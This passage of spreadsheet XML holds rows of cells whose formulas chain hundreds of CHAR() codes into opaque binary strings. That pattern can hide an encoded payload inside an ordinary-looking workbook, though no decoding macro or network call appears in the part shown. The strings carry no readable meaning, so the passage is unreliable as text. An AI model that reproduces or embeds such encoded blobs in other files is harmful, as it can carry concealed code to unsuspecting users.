Î_x0005_ŽOZí“	_x0007__x0007_²_x000E__x0012_M_x0006_$Ä	ÁŒ_x0003_ŽBQê‡_x000F__x0006__x0005_°!_x001E_E_x000D_%À_x0001_ÌŠ_x0004_‚B^ãy_x000F__x0006__x0005_¾_x000F__x001E_J_x000D_)Å_x0001_ÍŒ_x0010_IaêP_x0007_	_x0006_½¯_x0019_G_x000E_.Ä_x0007_ÏŒ_x000D_ƒAiîC_x0006_
	¾ñ_x001D_J	)Í_x0001_ÎŽ_x000F_€Mmå</v>
      </c>
      <c r="C90" t="str">
        <f>CHAR(110)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(113)&amp;CHAR(177)&amp;CHAR(117)&amp;CHAR(13)&amp;CHAR(86)&amp;CHAR(144)&amp;CHAR(91)</f>
        <v>n_x000D_€q±u_x000D_V[</v>
      </c>
    </row>
    <row r="91" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B91" t="str">
        <f>CHAR(55)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(184)&amp;CHAR(6)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(32)&amp;CHAR(196)&amp;CHAR(1)&amp;CHAR(206)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(130)&amp;CHAR(77)&amp;CHAR(102)&amp;CHAR(229)&amp;CHAR(36)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(190)&amp;CHAR(18)&amp;CHAR(31)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(41)&amp;CHAR(192)&amp;CHAR(9)&amp;CHAR(193)&amp;CHAR(141)&amp;CHAR(2)&amp;CHAR(138)&amp;CHAR(79)&amp;CHAR(119)&amp;CHAR(230)&amp;CHAR(22)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(190)&amp;CHAR(15)&amp;CHAR(17)&amp;CHAR(73)&amp;CHAR(13)&amp;CHAR(139)&amp;CHAR(81)&amp;CHAR(15)&amp;CHAR(33)&amp;CHAR(198)&amp;CHAR(140)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(26)&amp;CHAR(10)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(85)&amp;CHAR(140)&amp;CHAR(65)&amp;CHAR(125)&amp;CHAR(136)&amp;CHAR(130)&amp;CHAR(209)&amp;CHAR(13)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(135)&amp;CHAR(103)&amp;CHAR(18)&amp;CHAR(11)&amp;CHAR(90)&amp;CHAR(139)&amp;CHAR(117)&amp;CHAR(31)&amp;CHAR(253)&amp;CHAR(81)&amp;CHAR(125)&amp;CHAR(130)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(25)&amp;CHAR(134)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(68)&amp;CHAR(13)&amp;CHAR(87)&amp;CHAR(155)&amp;CHAR(131)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(90)&amp;CHAR(130)&amp;CHAR(23)&amp;CHAR(85)&amp;CHAR(252)&amp;CHAR(85)&amp;CHAR(31)&amp;CHAR(81)&amp;CHAR(91)&amp;CHAR(80)&amp;CHAR(199)&amp;CHAR(140)&amp;CHAR(83)&amp;CHAR(47)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(223)&amp;CHAR(115)&amp;CHAR(8)&amp;CHAR(179)&amp;CHAR(9)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(133)&amp;CHAR(236)&amp;CHAR(85)&amp;CHAR(90)&amp;CHAR(137)&amp;CHAR(94)&amp;CHAR(38)&amp;CHAR(10)&amp;CHAR(54)&amp;CHAR(192)&amp;CHAR(95)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(2)&amp;CHAR(88)&amp;CHAR(137)&amp;CHAR(122)&amp;CHAR(21)&amp;CHAR(137)&amp;CHAR(143)&amp;CHAR(133)&amp;CHAR(254)&amp;CHAR(8)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(61)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(126)&amp;CHAR(13)&amp;CHAR(75)&amp;CHAR(142)&amp;CHAR(251)&amp;CHAR(14)&amp;CHAR(119)&amp;CHAR(235)&amp;CHAR(236)&amp;CHAR(60)&amp;CHAR(55)&amp;CHAR(200)&amp;CHAR(138)&amp;CHAR(134)&amp;CHAR(128)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(56)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(123)&amp;CHAR(13)&amp;CHAR(74)&amp;CHAR(135)&amp;CHAR(254)&amp;CHAR(3)&amp;CHAR(126)&amp;CHAR(228)&amp;CHAR(226)&amp;CHAR(25)&amp;CHAR(53)&amp;CHAR(198)&amp;CHAR(128)&amp;CHAR(142)&amp;CHAR(134)&amp;CHAR(139)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(50)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(119)&amp;CHAR(10)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(240)&amp;CHAR(1)&amp;CHAR(112)&amp;CHAR(227)&amp;CHAR(135)&amp;CHAR(61)&amp;CHAR(49)&amp;CHAR(196)&amp;CHAR(234)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(40)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(9)&amp;CHAR(66)&amp;CHAR(6)&amp;CHAR(133)&amp;CHAR(88)&amp;CHAR(85)&amp;CHAR(94)&amp;CHAR(200)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(3)&amp;CHAR(124)&amp;CHAR(4)&amp;CHAR(107)&amp;CHAR(1)&amp;CHAR(104)&amp;CHAR(242)&amp;CHAR(129)&amp;CHAR(73)&amp;CHAR(10)&amp;CHAR(84)&amp;CHAR(136)&amp;CHAR(15)&amp;CHAR(248)&amp;CHAR(95)&amp;CHAR(61)&amp;CHAR(56)&amp;CHAR(196)&amp;CHAR(197)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(69)&amp;CHAR(41)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(195)&amp;CHAR(245)&amp;CHAR(249)&amp;CHAR(8)&amp;CHAR(196)</f>
        <v>7_x0002__x0002__x0004_¸_x0006__x0010_J_x0002_ Ä_x0001_ÎŽ_x0001_‚Mfå$_x0007__x0002__x0005_¾_x0012__x001F_A_x0001_)À	Á_x0002_ŠOwæ_x0016__x0006__x0004__x0007_¾_x000F__x0011_I_x000D_‹Q_x000F_!ÆŒy#_x001A_
Ê‰_x0004_UŒA}ˆ‚Ñ_x000D__x000F__x0002_‡g_x0012__x000B_Z‹u_x001F_ýQ}‚Ëp_x0019_†	‡D_x000D_W›ƒ_x0005__x0002__x000F_Z‚_x0017_UüU_x001F_Q[PÇŒS/_x0006_Œßs_x0008_³	I_x0007_…ìUZ‰^&amp;
6À_Žq)_x0002_X‰z_x0015_‰…þ_x0008__x000B__x0002_=_x0001_Œ~_x000D_KŽû_x000E_wëì&lt;7ÈŠ†€_x0006__x000D__x0006__x0004_8_x0003_Œ{_x000D_J‡þ_x0003_~äâ_x0019_5Æ€Ž†‹_x0001__x0007_
2_x0006_‰w
DŠð_x0001_pã‡=1Äê
ˆ(_x0002_³	B_x0006_…XU^È_x0001__x0002_F!_x0003_|_x0004_k_x0001_hòI
Tˆ_x000F_ø_=8ÄÅ_x000F__x000B_E)_x0002_ŒÃõù_x0008_Ä</v>
      </c>
      <c r="C91" t="str">
        <f>CHAR(184)&amp;CHAR(145)&amp;CHAR(57)&amp;CHAR(241)&amp;CHAR(140)&amp;CHAR(207)&amp;CHAR(185)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)</f>
        <v>¸‘9ñŒÏ¹[¸ô</v>
      </c>
    </row>
    <row r="92" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B92" t="str">
        <f>CHAR(70)&amp;CHAR(26)&amp;CHAR(65)&amp;CHAR(192)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(13)&amp;CHAR(250)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(16)&amp;CHAR(254)&amp;CHAR(82)&amp;CHAR(71)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(201)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(233)&amp;CHAR(19)&amp;CHAR(88)&amp;CHAR(142)&amp;CHAR(86)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(95)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(52)&amp;CHAR(233)&amp;CHAR(137)&amp;CHAR(170)&amp;CHAR(73)&amp;CHAR(5)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(189)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(15)&amp;CHAR(142)&amp;CHAR(204)&amp;CHAR(141)&amp;CHAR(123)&amp;CHAR(35)&amp;CHAR(27)&amp;CHAR(126)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(107)&amp;CHAR(15)&amp;CHAR(128)&amp;CHAR(129)&amp;CHAR(173)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(125)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(135)&amp;CHAR(207)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(88)&amp;CHAR(130)&amp;CHAR(129)&amp;CHAR(40)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(90)&amp;CHAR(143)&amp;CHAR(136)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(87)&amp;CHAR(244)&amp;CHAR(212)&amp;CHAR(143)&amp;CHAR(205)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(139)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(23)&amp;CHAR(140)&amp;CHAR(124)&amp;CHAR(11)&amp;CHAR(93)&amp;CHAR(132)&amp;CHAR(133)&amp;CHAR(56)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(94)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(66)&amp;CHAR(3)&amp;CHAR(91)&amp;CHAR(88)&amp;CHAR(246)&amp;CHAR(92)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(203)&amp;CHAR(5)&amp;CHAR(129)&amp;CHAR(101)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(86)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(91)&amp;CHAR(89)&amp;CHAR(142)&amp;CHAR(13)&amp;CHAR(242)&amp;CHAR(95)&amp;CHAR(39)&amp;CHAR(135)&amp;CHAR(196)&amp;CHAR(14)&amp;CHAR(138)&amp;CHAR(87)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(136)&amp;CHAR(126)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(7)&amp;CHAR(127)&amp;CHAR(31)&amp;CHAR(129)&amp;CHAR(2)&amp;CHAR(143)&amp;CHAR(76)&amp;CHAR(10)&amp;CHAR(85)&amp;CHAR(138)&amp;CHAR(149)&amp;CHAR(88)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(95)&amp;CHAR(129)&amp;CHAR(24)&amp;CHAR(139)&amp;CHAR(135)&amp;CHAR(79)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(90)&amp;CHAR(251)&amp;CHAR(85)&amp;CHAR(35)&amp;CHAR(56)&amp;CHAR(245)&amp;CHAR(140)&amp;CHAR(205)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(56)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(137)&amp;CHAR(10)&amp;CHAR(253)&amp;CHAR(87)&amp;CHAR(45)&amp;CHAR(140)&amp;CHAR(201)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(8)&amp;CHAR(15)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(132)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(91)&amp;CHAR(244)&amp;CHAR(81)&amp;CHAR(118)&amp;CHAR(142)&amp;CHAR(81)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(242)&amp;CHAR(128)&amp;CHAR(68)&amp;CHAR(6)&amp;CHAR(82)&amp;CHAR(111)&amp;CHAR(7)&amp;CHAR(157)&amp;CHAR(14)&amp;CHAR(86)&amp;CHAR(83)&amp;CHAR(139)&amp;CHAR(75)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(51)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(254)&amp;CHAR(250)&amp;CHAR(88)&amp;CHAR(112)</f>
        <v>F_x001A_AÀ_x0006__x0002_A-_x000D_úq)_x0006_„B_x0010_þRG9ÂÉ_x0003__x0002_…é_x0013_XŽV)_x001E__TR4é‰ªI_x0005__x000F_
Š½_x0008__x0006__x0007__x0007__x000F_ŽÌ{#_x001B_~
†k_x000F_€­_x0007__x0005__x0007_}&amp;.‡Ï
Ì_x0004__x0005__x000D_X‚(_x0005__x0002__x000B_Zˆ_x0017__x0006__x0006__x0005_WôÔÍ_x000D_‚‹_x0004__x0007__x0016__x0017_Œ|_x000B_]„…8_x0007__x0007__x0007_^Ž_x0001_‰B_x0003_[Xö\
ŠË_x0005_e_x0004__x0007_
‚_x0005_V"_x0011_[YŽ_x000D_ò_'‡Ä_x000E_ŠW_x000B__x0002__x000B_ˆ~"_x0011__x0007__x001F__x0002_L
UŠ•X_x0005__x0001__x0002___x0018_‹‡O_x0003__x0007__x000E_UZûU#8õŒÍ	‡8_x000B_	_x0007_ŽA_x0002_Y‰
ýW-ŒÉ
_x0008__x000F__x000F__x0002_‰„_x0006_	
_x0002_[ôQvŽQ_x0003_Žò€D_x0006_Ro_x0007__x000E_VS‹K.!ùU3PŒþúXp</v>
      </c>
      <c r="C92" t="str">
        <f>CHAR(57)&amp;CHAR(243)&amp;CHAR(79)&amp;CHAR(162)&amp;CHAR(16)&amp;CHAR(156)&amp;CHAR(56)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(122)</f>
        <v>9óO¢_x0010_œ8ôqz</v>
      </c>
    </row>
    <row r="93" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B93" t="str">
        <f>CHAR(130)&amp;CHAR(241)&amp;CHAR(4)&amp;CHAR(130)&amp;CHAR(222)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(128)&amp;CHAR(94)&amp;CHAR(45)&amp;CHAR(31)&amp;CHAR(142)&amp;CHAR(115)&amp;CHAR(46)&amp;CHAR(37)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(143)&amp;CHAR(64)&amp;CHAR(21)&amp;CHAR(89)&amp;CHAR(132)&amp;CHAR(134)&amp;CHAR(105)&amp;CHAR(9)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(137)&amp;CHAR(14)&amp;CHAR(81)&amp;CHAR(80)&amp;CHAR(244)&amp;CHAR(27)&amp;CHAR(135)&amp;CHAR(203)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(179)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(110)&amp;CHAR(41)&amp;CHAR(34)&amp;CHAR(10)&amp;CHAR(137)&amp;CHAR(128)&amp;CHAR(23)&amp;CHAR(15)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(43)&amp;CHAR(22)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(31)&amp;CHAR(87)&amp;CHAR(109)&amp;CHAR(15)&amp;CHAR(111)&amp;CHAR(26)&amp;CHAR(251)&amp;CHAR(84)&amp;CHAR(95)&amp;CHAR(128)&amp;CHAR(242)&amp;CHAR(140)&amp;CHAR(242)&amp;CHAR(9)&amp;CHAR(139)&amp;CHAR(155)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(80)&amp;CHAR(6)&amp;CHAR(58)&amp;CHAR(194)&amp;CHAR(137)&amp;CHAR(202)&amp;CHAR(63)&amp;CHAR(128)&amp;CHAR(29)&amp;CHAR(16)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(127)&amp;CHAR(35)&amp;CHAR(120)&amp;CHAR(10)&amp;CHAR(61)&amp;CHAR(132)&amp;CHAR(18)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(125)&amp;CHAR(40)&amp;CHAR(49)&amp;CHAR(221)&amp;CHAR(143)&amp;CHAR(131)&amp;CHAR(34)&amp;CHAR(29)&amp;CHAR(19)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(153)&amp;CHAR(21)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(120)&amp;CHAR(228)&amp;CHAR(113)&amp;CHAR(12)&amp;CHAR(56)&amp;CHAR(138)&amp;CHAR(23)&amp;CHAR(23)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(118)&amp;CHAR(228)&amp;CHAR(140)&amp;CHAR(87)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(72)&amp;CHAR(31)&amp;CHAR(134)&amp;CHAR(76)&amp;CHAR(29)&amp;CHAR(87)&amp;CHAR(82)&amp;CHAR(86)&amp;CHAR(129)&amp;CHAR(24)&amp;CHAR(253)&amp;CHAR(144)&amp;CHAR(182)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(254)&amp;CHAR(221)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(61)&amp;CHAR(221)&amp;CHAR(66)&amp;CHAR(143)&amp;CHAR(203)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(76)&amp;CHAR(14)&amp;CHAR(63)&amp;CHAR(144)&amp;CHAR(19)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(127)&amp;CHAR(37)&amp;CHAR(125)&amp;CHAR(10)&amp;CHAR(60)&amp;CHAR(146)&amp;CHAR(6)&amp;CHAR(29)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(116)&amp;CHAR(18)&amp;CHAR(130)&amp;CHAR(157)&amp;CHAR(47)&amp;CHAR(28)&amp;CHAR(26)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(17)&amp;CHAR(3)&amp;CHAR(69)&amp;CHAR(60)&amp;CHAR(146)&amp;CHAR(31)&amp;CHAR(19)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(116)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(2)&amp;CHAR(50)&amp;CHAR(138)&amp;CHAR(21)&amp;CHAR(30)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(112)&amp;CHAR(225)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(86)&amp;CHAR(109)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(81)&amp;CHAR(81)&amp;CHAR(95)&amp;CHAR(95)&amp;CHAR(130)&amp;CHAR(198)&amp;CHAR(31)&amp;CHAR(201)&amp;CHAR(129)&amp;CHAR(44)&amp;CHAR(11)&amp;CHAR(235)&amp;CHAR(202)&amp;CHAR(251)&amp;CHAR(248)&amp;CHAR(244)&amp;CHAR(140)&amp;CHAR(52)&amp;CHAR(228)&amp;CHAR(197)&amp;CHAR(244)&amp;CHAR(253)&amp;CHAR(250)&amp;CHAR(52)&amp;CHAR(233)&amp;CHAR(137)&amp;CHAR(71)&amp;CHAR(9)</f>
        <v xml:space="preserve">‚ñ_x0004_‚Þ_x000D__x0006__x000F_€^-_x001F_Žs.%‰_x0010_@_x0015_Y„†i	_x000E__x000F_‰_x000E_QPô_x001B_‡Ë_x0004_Š³_x0005__x0007__x000B_†n)"
‰€_x0017__x000F__x0004__x0001_ˆF+_x0016_„B _x001F_Wm_x000F_o_x001A_ûT_€òŒò	‹›
	_x0007_ŽP_x0006_:Â‰Ê?€_x001D__x0010__x0005__x0005_#x
=„_x0012__x0012_
_x0002_}(1Ýƒ"_x001D__x0013__x000D__x0002_‚_x0006__x000F_F-™_x0015__x0018__x0002__x000F_xäq_x000C_8Š_x0017__x0017__x0005__x000B_väŒW.!†H_x001F_†L_x001D_WRV_x0018_ý¶_x0006__x0005_	þÝ_x001E_Í=ÝBË‹O._x0012_€L_x000E_?_x0013__x0012__x0005_
%}
&lt;’_x0006__x001D__x0001__x0001_t_x0012_‚/_x001C__x001A__x0007__x0007_†_x0011__x0003_E&lt;’_x001F__x0013_	_x000D_tâ|_x0002_2Š_x0015__x001E_
	páUùVm‚A!_x001D_QQ__‚Æ_x001F_É,_x000B_ëÊûøôŒ4äÅôýú4é‰G	</v>
      </c>
      <c r="C93" t="str">
        <f>CHAR(192)&amp;CHAR(97)&amp;CHAR(174)&amp;CHAR(19)&amp;CHAR(53)&amp;CHAR(193)&amp;CHAR(58)&amp;CHAR(126)&amp;CHAR(136)&amp;CHAR(234)</f>
        <v>Àa®_x0013_5Á:~ˆê</v>
      </c>
    </row>
    <row r="94" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B94" t="str">
        <f>CHAR(82)&amp;CHAR(130)&amp;CHAR(137)&amp;CHAR(85)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(87)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(73)&amp;CHAR(15)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(87)&amp;CHAR(92)&amp;CHAR(93)&amp;CHAR(246)&amp;CHAR(158)&amp;CHAR(166)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(199)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(161)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(253)&amp;CHAR(139)&amp;CHAR(120)&amp;CHAR(13)&amp;CHAR(58)&amp;CHAR(201)&amp;CHAR(238)&amp;CHAR(187)&amp;CHAR(142)&amp;CHAR(226)&amp;CHAR(99)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(93)&amp;CHAR(38)&amp;CHAR(127)&amp;CHAR(57)&amp;CHAR(194)&amp;CHAR(94)&amp;CHAR(93)&amp;CHAR(85)&amp;CHAR(139)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(55)&amp;CHAR(54)&amp;CHAR(231)&amp;CHAR(44)&amp;CHAR(110)&amp;CHAR(46)&amp;CHAR(22)&amp;CHAR(136)&amp;CHAR(180)&amp;CHAR(94)&amp;CHAR(3)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(169)&amp;CHAR(164)&amp;CHAR(161)&amp;CHAR(162)&amp;CHAR(53)&amp;CHAR(196)&amp;CHAR(101)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(42)&amp;CHAR(21)&amp;CHAR(75)&amp;CHAR(61)&amp;CHAR(132)&amp;CHAR(11)&amp;CHAR(14)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(121)&amp;CHAR(4)&amp;CHAR(132)&amp;CHAR(61)&amp;CHAR(137)&amp;CHAR(55)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(110)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(130)&amp;CHAR(33)&amp;CHAR(141)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(70)&amp;CHAR(27)&amp;CHAR(143)&amp;CHAR(124)&amp;CHAR(29)&amp;CHAR(85)&amp;CHAR(90)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(244)&amp;CHAR(91)&amp;CHAR(66)&amp;CHAR(131)&amp;CHAR(197)&amp;CHAR(8)&amp;CHAR(131)&amp;CHAR(68)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(83)&amp;CHAR(50)&amp;CHAR(16)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(137)&amp;CHAR(7)&amp;CHAR(245)&amp;CHAR(88)&amp;CHAR(78)&amp;CHAR(129)&amp;CHAR(195)&amp;CHAR(8)&amp;CHAR(143)&amp;CHAR(64)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(67)&amp;CHAR(47)&amp;CHAR(46)&amp;CHAR(89)&amp;CHAR(103)&amp;CHAR(7)&amp;CHAR(240)&amp;CHAR(127)&amp;CHAR(46)&amp;CHAR(21)&amp;CHAR(248)&amp;CHAR(86)&amp;CHAR(111)&amp;CHAR(135)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(34)&amp;CHAR(82)&amp;CHAR(108)&amp;CHAR(4)&amp;CHAR(246)&amp;CHAR(125)&amp;CHAR(33)&amp;CHAR(25)&amp;CHAR(242)&amp;CHAR(93)&amp;CHAR(99)&amp;CHAR(137)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(34)&amp;CHAR(32)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(47)&amp;CHAR(136)&amp;CHAR(194)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(131)&amp;CHAR(183)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(104)&amp;CHAR(11)&amp;CHAR(104)&amp;CHAR(5)&amp;CHAR(109)&amp;CHAR(26)&amp;CHAR(251)&amp;CHAR(82)&amp;CHAR(93)&amp;CHAR(137)&amp;CHAR(231)&amp;CHAR(57)&amp;CHAR(192)&amp;CHAR(63)&amp;CHAR(138)&amp;CHAR(7)&amp;CHAR(15)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(189)&amp;CHAR(3)&amp;CHAR(36)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(109)&amp;CHAR(131)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(42)&amp;CHAR(123)&amp;CHAR(83)&amp;CHAR(245)&amp;CHAR(191)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(88)&amp;CHAR(104)&amp;CHAR(10)&amp;CHAR(253)&amp;CHAR(85)&amp;CHAR(89)&amp;CHAR(128)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(49)&amp;CHAR(62)&amp;CHAR(206)&amp;CHAR(134)&amp;CHAR(134)&amp;CHAR(32)&amp;CHAR(129)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(59)&amp;CHAR(141)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(113)</f>
        <v>R‚‰U_x0002__x0004__x0003_WŠI_x000F__x0004__x0007_W\]öž¦_x000F__x000B_
ŒÇ
Ž¡÷ýý‹x_x000D_:Éî»ŽâcQ]&amp;9Â^]U‹y#76ç,n._x0016_ˆ´^_x0003__x0001__x0001_©¤¡¢5ÄeŽC*_x0015_K=„_x000B__x000E_
	y_x0004_„=‰7_x0005_
‚n_x0008__x0002__x0002_‰‚!	_x0005__x0005_†F_x001B_|_x001D_UZ_x0003_ô[BƒÅ_x0008_ƒD_x000B__x000D__x0002__x0005_ˆS2_x0010_SQ‰_x0007_õXNÃ_x0008_@_x0007__x000B__x0004_ŠC/.Yg_x0007_ð._x0015_øVo‡M&amp;"Rl_x0004_ö}!_x0019_ò]c‰@%" N&amp;/ˆÂ_x0007_
ƒ·_x0005_
_x000D_h_x000B_h_x0005_m_x001A_ûR]‰ç9À?Š_x0007__x000F__x0007__x000E_½_x0003_$_x0007__x0007_mƒM)*{Sõ¿_x0003__x000D__x0007_
Xh
ýUY€M!1&gt;Î†† _x0002__x000B_
;_x000F_
_x0006__x0005_q</v>
      </c>
      <c r="C94" t="str">
        <f>CHAR(217)&amp;CHAR(156)&amp;CHAR(121)&amp;CHAR(244)&amp;CHAR(99)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(25)&amp;CHAR(53)&amp;CHAR(62)</f>
        <v>Ùœyôczˆ_x0019_5&gt;</v>
      </c>
    </row>
    <row r="95" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B95" t="str">
